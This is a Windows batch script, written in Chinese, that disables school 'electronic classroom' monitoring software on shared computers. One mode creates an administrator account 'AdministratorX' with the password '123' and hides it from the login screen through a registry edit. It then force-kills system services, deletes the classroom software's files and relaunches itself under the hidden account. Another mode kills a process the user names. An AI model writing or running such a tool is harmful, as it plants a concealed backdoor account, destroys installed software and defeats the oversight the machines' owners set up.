cls
@echo off
title 电子教室杀手,适用于Windows 95/NT/98/ME/2000/XP/Vista/7
echo 版本：2.2
echo =====================================欢迎使用==================================
echo 请选择屏蔽方式
echo 1.2000/XP自动屏蔽(效果强)
echo 2.手动输入屏蔽(适用于高级用户)
echo 3.2000/XP/Vista/7自动屏蔽(推荐)
echo .
echo 数字代表选项，输入后按回车键
set xp=0
set /p xp=
if %xp%==1 goto xp1
if %xp%==2 goto xp2
if %xp%==3 %temp%\autokill.bat
if %xp%==0 goto xp0
:xp1
cls
echo 请等待...
title 正在屏蔽中...请稍等
if not exist "%windir%\system32\taskmgr.exe" autokill.bat
net user AdministratorX /add
net localgroup administrators "AdministratorX" /add
net user AdministratorX 123
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v AdministratorX /t REG_DWORD /d 0 /f
pv.exe -f -k tcpsvcs.exe
pv.exe -f -k *checkrs*.exe
pv.exe -f -k inetinfo.exe
pv.exe -f -k snmp.exe
pv.exe -f -k mqsvc.exe
pv.exe -f -k winmgmt.exe
del "%programfiles%\guanbao\ets classroom\*" /F /Q
cpau.exe -u administratorX -p 123 -ex autokill.bat -lwp
%windir%\system32\pv.exe tcpsvcs.exe
exit
:xp2
cls
"%temp%\pv.exe"
echo .
echo 使用滚轮以察看上面的内容
echo 上面有正在运行程序，一般而言电子教室的主程序都带有"student"字样，请找到后记录下程序的名字(可以使用通配符，如*或？)
echo 请输入你所使用的电子教室的主程序名(.exe不能省略)，回车确认。
set /p name=
echo 正在强制终结...
title 正在屏蔽中...请稍等
cls
set erhalf=1
ntsd -c q -pn %name%
if not errorlevel 1 set erhalf=0
"%temp%\pv.exe" -f -k %name%
if not errorlevel 1 set erhalf=0
cls
if %erhalf%==0 echo 屏蔽成功！
if %erhalf%==0 title 屏蔽成功！
if %erhalf%==1 echo 屏蔽失败！
if %erhalf%==1 title 屏蔽失败！
pause
exit
:xp0
autokill.bat
exit